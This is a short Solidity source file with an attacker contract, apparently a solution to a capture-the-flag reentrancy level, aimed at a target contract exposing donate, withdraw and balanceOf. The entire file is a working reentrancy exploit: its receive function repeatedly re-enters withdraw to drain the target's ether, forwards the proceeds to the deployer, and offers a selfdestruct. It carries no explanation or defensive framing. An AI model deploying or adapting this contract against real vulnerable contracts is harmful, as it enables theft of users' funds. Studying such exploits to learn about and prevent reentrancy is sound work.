
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256);
}

contract AttackReentrance {
    IReentrance reentrance;
    address payable owner;

    constructor(address _reentranceAddress) public {
        reentrance = IReentrance(_reentranceAddress);
        owner = msg.sender;
    }

    function pwn() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(reentrance.balanceOf(address(this)));
        } else {
            owner.transfer(address(this).balance);
        }
    }

    function kill() public {
        selfdestruct(owner);
    }
}
